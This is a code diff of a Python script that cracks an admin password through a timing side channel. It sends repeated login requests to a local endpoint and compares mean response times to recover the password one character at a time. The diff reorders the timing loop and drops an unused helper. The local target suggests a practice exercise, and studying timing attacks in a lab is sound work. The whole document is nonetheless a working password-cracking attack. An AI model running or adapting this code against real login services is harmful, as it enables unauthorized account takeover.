@@ -4,9 +4,6 @@ import statistics
 
 CHARS = string.ascii_lowercase
 
-def random_str(size):
-    return ''.join(random.choices(allowed_chars, k=size))
-
 def apiRequest(inputPass):
     response = requests.post('http://127.0.0.1:5000/login', data={'username':'admin','password':str(inputPass)})
     respTime = response.elapsed.total_seconds()
@@ -27,17 +24,17 @@ def crackPassword(length, cycles=2):
     guess = '0'*length
     for i in range(length):
         for char in CHARS:
-            newGuess = guess[:i] + char + guess[i + 1:]
+            newGuess = guess[:i] + char + guess[i+1:]
 
             guessResponseTimes = []
-            for k in range(cycles):
-                guessResponseTimes.append(apiRequest(guess))
-            guessTime = statistics.mean(guessResponseTimes)
-
             newGuessResponseTimes = []
             for k in range(cycles):
+                guessResponseTimes.append(apiRequest(guess))
                 newGuessResponseTimes.append(apiRequest(newGuess))
+            guessTime = statistics.mean(guessResponseTimes)
             newGuessTime = statistics.mean(newGuessResponseTimes)
+
+            # for k in range(cycles):
             
             print('Current guess: '+guess)
             
